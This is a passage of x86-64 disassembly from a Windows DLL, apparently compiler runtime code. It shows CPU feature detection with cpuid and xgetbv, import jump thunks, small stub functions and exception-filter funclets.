   180001e67:	b8 24 00 00 00       	mov    $0x24,%eax
   180001e6c:	44 3b f0             	cmp    %eax,%r14d
   180001e6f:	7c 13                	jl     0x180001e84
   180001e71:	33 c9                	xor    %ecx,%ecx
   180001e73:	0f a2                	cpuid
   180001e75:	44 8b db             	mov    %ebx,%r11d
   180001e78:	89 45 f0             	mov    %eax,-0x10(%rbp)
   180001e7b:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   180001e7e:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   180001e81:	89 55 fc             	mov    %edx,-0x4(%rbp)
   180001e84:	48 8b 05 c5 21 00 00 	mov    0x21c5(%rip),%rax        # 0x180004050
   180001e8b:	bb 06 00 00 00       	mov    $0x6,%ebx
   180001e90:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   180001e94:	c7 05 ba 21 00 00 01 	movl   $0x1,0x21ba(%rip)        # 0x180004058
   180001e9b:	00 00 00 
   180001e9e:	c7 05 b4 21 00 00 02 	movl   $0x2,0x21b4(%rip)        # 0x18000405c
   180001ea5:	00 00 00 
   180001ea8:	48 89 05 a1 21 00 00 	mov    %rax,0x21a1(%rip)        # 0x180004050
   180001eaf:	0f ba e7 14          	bt     $0x14,%edi
   180001eb3:	73 1b                	jae    0x180001ed0
   180001eb5:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   180001eb9:	c7 05 95 21 00 00 02 	movl   $0x2,0x2195(%rip)        # 0x180004058
   180001ec0:	00 00 00 
   180001ec3:	48 89 05 86 21 00 00 	mov    %rax,0x2186(%rip)        # 0x180004050
   180001eca:	89 1d 8c 21 00 00    	mov    %ebx,0x218c(%rip)        # 0x18000405c
   180001ed0:	0f ba e7 1b          	bt     $0x1b,%edi
   180001ed4:	0f 83 2b 01 00 00    	jae    0x180002005
   180001eda:	33 c9                	xor    %ecx,%ecx
   180001edc:	0f 01 d0             	xgetbv
   180001edf:	48 c1 e2 20          	shl    $0x20,%rdx
   180001ee3:	48 0b d0             	or     %rax,%rdx
   180001ee6:	48 89 55 20          	mov    %rdx,0x20(%rbp)
   180001eea:	0f ba e7 1c          	bt     $0x1c,%edi
   180001eee:	0f 83 f6 00 00 00    	jae    0x180001fea
   180001ef4:	48 8b 45 20          	mov    0x20(%rbp),%rax
   180001ef8:	22 c3                	and    %bl,%al
   180001efa:	3a c3                	cmp    %bl,%al
   180001efc:	0f 85 e8 00 00 00    	jne    0x180001fea
   180001f02:	8b 05 54 21 00 00    	mov    0x2154(%rip),%eax        # 0x18000405c
   180001f08:	b2 e0                	mov    $0xe0,%dl
   180001f0a:	83 c8 08             	or     $0x8,%eax
   180001f0d:	c7 05 41 21 00 00 03 	movl   $0x3,0x2141(%rip)        # 0x180004058
   180001f14:	00 00 00 
   180001f17:	89 05 3f 21 00 00    	mov    %eax,0x213f(%rip)        # 0x18000405c
   180001f1d:	41 f6 c1 20          	test   $0x20,%r9b
   180001f21:	74 5d                	je     0x180001f80
   180001f23:	83 c8 20             	or     $0x20,%eax
   180001f26:	c7 05 28 21 00 00 05 	movl   $0x5,0x2128(%rip)        # 0x180004058
   180001f2d:	00 00 00 
   180001f30:	89 05 26 21 00 00    	mov    %eax,0x2126(%rip)        # 0x18000405c
   180001f36:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   180001f3b:	48 8b 05 0e 21 00 00 	mov    0x210e(%rip),%rax        # 0x180004050
   180001f42:	44 23 c9             	and    %ecx,%r9d
   180001f45:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   180001f49:	48 89 05 00 21 00 00 	mov    %rax,0x2100(%rip)        # 0x180004050
   180001f50:	44 3b c9             	cmp    %ecx,%r9d
   180001f53:	75 32                	jne    0x180001f87
   180001f55:	48 8b 45 20          	mov    0x20(%rbp),%rax
   180001f59:	22 c2                	and    %dl,%al
   180001f5b:	3a c2                	cmp    %dl,%al
   180001f5d:	75 21                	jne    0x180001f80
   180001f5f:	48 8b 05 ea 20 00 00 	mov    0x20ea(%rip),%rax        # 0x180004050
   180001f66:	83 0d ef 20 00 00 40 	orl    $0x40,0x20ef(%rip)        # 0x18000405c
   180001f6d:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   180001f71:	89 1d e1 20 00 00    	mov    %ebx,0x20e1(%rip)        # 0x180004058
   180001f77:	48 89 05 d2 20 00 00 	mov    %rax,0x20d2(%rip)        # 0x180004050
   180001f7e:	eb 07                	jmp    0x180001f87
   180001f80:	48 8b 05 c9 20 00 00 	mov    0x20c9(%rip),%rax        # 0x180004050
   180001f87:	0f ba e6 17          	bt     $0x17,%esi
   180001f8b:	73 0c                	jae    0x180001f99
   180001f8d:	48 0f ba f0 18       	btr    $0x18,%rax
   180001f92:	48 89 05 b7 20 00 00 	mov    %rax,0x20b7(%rip)        # 0x180004050
   180001f99:	41 0f ba e2 13       	bt     $0x13,%r10d
   180001f9e:	73 4a                	jae    0x180001fea
   180001fa0:	48 8b 45 20          	mov    0x20(%rbp),%rax
   180001fa4:	22 c2                	and    %dl,%al
   180001fa6:	3a c2                	cmp    %dl,%al
   180001fa8:	75 40                	jne    0x180001fea
   180001faa:	41 8b cb             	mov    %r11d,%ecx
   180001fad:	41 8b c3             	mov    %r11d,%eax
   180001fb0:	48 c1 e9 10          	shr    $0x10,%rcx
   180001fb4:	25 ff 00 04 00       	and    $0x400ff,%eax
   180001fb9:	83 e1 07             	and    $0x7,%ecx
   180001fbc:	89 05 aa 62 00 00    	mov    %eax,0x62aa(%rip)        # 0x18000826c
   180001fc2:	48 81 c9 28 00 00 01 	or     $0x1000028,%rcx
   180001fc9:	48 f7 d1             	not    %rcx
   180001fcc:	48 23 0d 7d 20 00 00 	and    0x207d(%rip),%rcx        # 0x180004050
   180001fd3:	48 89 0d 76 20 00 00 	mov    %rcx,0x2076(%rip)        # 0x180004050
   180001fda:	83 f8 01             	cmp    $0x1,%eax
   180001fdd:	76 0b                	jbe    0x180001fea
   180001fdf:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   180001fe3:	48 89 0d 66 20 00 00 	mov    %rcx,0x2066(%rip)        # 0x180004050
   180001fea:	41 0f ba e2 15       	bt     $0x15,%r10d
   180001fef:	73 14                	jae    0x180002005
   180001ff1:	48 8b 45 20          	mov    0x20(%rbp),%rax
   180001ff5:	48 0f ba e0 13       	bt     $0x13,%rax
   180001ffa:	73 09                	jae    0x180002005
   180001ffc:	48 0f ba 35 4b 20 00 	btrq   $0x7,0x204b(%rip)        # 0x180004050
   180002003:	00 07 
   180002005:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   18000200a:	33 c0                	xor    %eax,%eax
   18000200c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180002011:	48 83 c4 10          	add    $0x10,%rsp
   180002015:	41 5e                	pop    %r14
   180002017:	5f                   	pop    %rdi
   180002018:	5d                   	pop    %rbp
   180002019:	c3                   	ret
   18000201a:	cc                   	int3
   18000201b:	cc                   	int3
   18000201c:	b8 01 00 00 00       	mov    $0x1,%eax
   180002021:	c3                   	ret
   180002022:	cc                   	int3
   180002023:	cc                   	int3
   180002024:	33 c0                	xor    %eax,%eax
   180002026:	39 05 44 20 00 00    	cmp    %eax,0x2044(%rip)        # 0x180004070
   18000202c:	0f 95 c0             	setne  %al
   18000202f:	c3                   	ret
   180002030:	ff 25 82 10 00 00    	jmp    *0x1082(%rip)        # 0x1800030b8
   180002036:	ff 25 74 10 00 00    	jmp    *0x1074(%rip)        # 0x1800030b0
   18000203c:	ff 25 86 10 00 00    	jmp    *0x1086(%rip)        # 0x1800030c8
   180002042:	ff 25 c8 10 00 00    	jmp    *0x10c8(%rip)        # 0x180003110
   180002048:	ff 25 ba 10 00 00    	jmp    *0x10ba(%rip)        # 0x180003108
   18000204e:	ff 25 ac 10 00 00    	jmp    *0x10ac(%rip)        # 0x180003100
   180002054:	ff 25 9e 10 00 00    	jmp    *0x109e(%rip)        # 0x1800030f8
   18000205a:	ff 25 78 10 00 00    	jmp    *0x1078(%rip)        # 0x1800030d8
   180002060:	ff 25 82 10 00 00    	jmp    *0x1082(%rip)        # 0x1800030e8
   180002066:	ff 25 84 10 00 00    	jmp    *0x1084(%rip)        # 0x1800030f0
   18000206c:	ff 25 6e 10 00 00    	jmp    *0x106e(%rip)        # 0x1800030e0
   180002072:	cc                   	int3
   180002073:	cc                   	int3
   180002074:	b0 01                	mov    $0x1,%al
   180002076:	c3                   	ret
   180002077:	cc                   	int3
   180002078:	33 c0                	xor    %eax,%eax
   18000207a:	c3                   	ret
   18000207b:	cc                   	int3
   18000207c:	48 83 ec 28          	sub    $0x28,%rsp
   180002080:	4d 8b 41 38          	mov    0x38(%r9),%r8
   180002084:	48 8b ca             	mov    %rdx,%rcx
   180002087:	49 8b d1             	mov    %r9,%rdx
   18000208a:	e8 0d 00 00 00       	call   0x18000209c
   18000208f:	b8 01 00 00 00       	mov    $0x1,%eax
   180002094:	48 83 c4 28          	add    $0x28,%rsp
   180002098:	c3                   	ret
   180002099:	cc                   	int3
   18000209a:	cc                   	int3
   18000209b:	cc                   	int3
   18000209c:	40 53                	rex push %rbx
   18000209e:	45 8b 18             	mov    (%r8),%r11d
   1800020a1:	48 8b da             	mov    %rdx,%rbx
   1800020a4:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1800020a8:	4c 8b c9             	mov    %rcx,%r9
   1800020ab:	41 f6 00 04          	testb  $0x4,(%r8)
   1800020af:	4c 8b d1             	mov    %rcx,%r10
   1800020b2:	74 13                	je     0x1800020c7
   1800020b4:	41 8b 40 08          	mov    0x8(%r8),%eax
   1800020b8:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1800020bc:	f7 d8                	neg    %eax
   1800020be:	4c 03 d1             	add    %rcx,%r10
   1800020c1:	48 63 c8             	movslq %eax,%rcx
   1800020c4:	4c 23 d1             	and    %rcx,%r10
   1800020c7:	49 63 c3             	movslq %r11d,%rax
   1800020ca:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1800020ce:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1800020d2:	8b 48 08             	mov    0x8(%rax),%ecx
   1800020d5:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1800020d9:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   1800020de:	74 0b                	je     0x1800020eb
   1800020e0:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   1800020e5:	83 e0 f0             	and    $0xfffffff0,%eax
   1800020e8:	4c 03 c8             	add    %rax,%r9
   1800020eb:	4c 33 ca             	xor    %rdx,%r9
   1800020ee:	49 8b c9             	mov    %r9,%rcx
   1800020f1:	5b                   	pop    %rbx
   1800020f2:	e9 89 f1 ff ff       	jmp    0x180001280
   1800020f7:	ff 25 c3 0f 00 00    	jmp    *0xfc3(%rip)        # 0x1800030c0
   1800020fd:	cc                   	int3
   1800020fe:	cc                   	int3
   1800020ff:	cc                   	int3
   180002100:	cc                   	int3
   180002101:	cc                   	int3
   180002102:	cc                   	int3
   180002103:	cc                   	int3
   180002104:	cc                   	int3
   180002105:	cc                   	int3
   180002106:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000210d:	00 00 00 
   180002110:	ff e0                	jmp    *%rax
   180002112:	cc                   	int3
   180002113:	cc                   	int3
   180002114:	cc                   	int3
   180002115:	cc                   	int3
   180002116:	cc                   	int3
   180002117:	cc                   	int3
   180002118:	cc                   	int3
   180002119:	cc                   	int3
   18000211a:	cc                   	int3
   18000211b:	cc                   	int3
   18000211c:	cc                   	int3
   18000211d:	cc                   	int3
   18000211e:	cc                   	int3
   18000211f:	cc                   	int3
   180002120:	cc                   	int3
   180002121:	cc                   	int3
   180002122:	cc                   	int3
   180002123:	cc                   	int3
   180002124:	cc                   	int3
   180002125:	cc                   	int3
   180002126:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000212d:	00 00 00 
   180002130:	ff 25 12 10 00 00    	jmp    *0x1012(%rip)        # 0x180003148
   180002136:	40 55                	rex push %rbp
   180002138:	48 83 ec 20          	sub    $0x20,%rsp
   18000213c:	48 8b ea             	mov    %rdx,%rbp
   18000213f:	8a 4d 40             	mov    0x40(%rbp),%cl
   180002142:	48 83 c4 20          	add    $0x20,%rsp
   180002146:	5d                   	pop    %rbp
   180002147:	e9 e0 f9 ff ff       	jmp    0x180001b2c
   18000214c:	cc                   	int3
   18000214d:	40 55                	rex push %rbp
   18000214f:	48 83 ec 20          	sub    $0x20,%rsp
   180002153:	48 8b ea             	mov    %rdx,%rbp
   180002156:	8a 4d 20             	mov    0x20(%rbp),%cl
   180002159:	e8 ce f9 ff ff       	call   0x180001b2c
   18000215e:	90                   	nop
   18000215f:	48 83 c4 20          	add    $0x20,%rsp
   180002163:	5d                   	pop    %rbp
   180002164:	c3                   	ret
   180002165:	cc                   	int3
   180002166:	40 55                	rex push %rbp
   180002168:	48 83 ec 20          	sub    $0x20,%rsp
   18000216c:	48 8b ea             	mov    %rdx,%rbp
   18000216f:	48 83 c4 20          	add    $0x20,%rsp
   180002173:	5d                   	pop    %rbp
   180002174:	e9 3f f8 ff ff       	jmp    0x1800019b8
   180002179:	cc                   	int3
   18000217a:	40 55                	rex push %rbp
   18000217c:	48 83 ec 30          	sub    $0x30,%rsp
   180002180:	48 8b ea             	mov    %rdx,%rbp
   180002183:	48 8b 01             	mov    (%rcx),%rax
   180002186:	8b 10                	mov    (%rax),%edx
   180002188:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000218d:	89 54 24 20          	mov    %edx,0x20(%rsp)
   180002191:	4c 8d 0d 08 f1 ff ff 	lea    -0xef8(%rip),%r9        # 0x1800012a0
   180002198:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   18000219c:	8b 55 68             	mov    0x68(%rbp),%edx
   18000219f:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1800021a3:	e8 80 f7 ff ff       	call   0x180001928
   1800021a8:	90                   	nop
   1800021a9:	48 83 c4 30          	add    $0x30,%rsp
   1800021ad:	5d                   	pop    %rbp
   1800021ae:	c3                   	ret
   1800021af:	cc                   	int3
   1800021b0:	40 55                	rex push %rbp
   1800021b2:	48 8b ea             	mov    %rdx,%rbp
   1800021b5:	48 8b 01             	mov    (%rcx),%rax
   1800021b8:	33 c9                	xor    %ecx,%ecx
   1800021ba:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   1800021c0:	0f 94 c1             	sete   %cl
   1800021c3:	8b c1                	mov    %ecx,%eax
   1800021c5:	5d                   	pop    %rbp
   1800021c6:	c3                   	ret
   1800021c7:	cc                   	int3
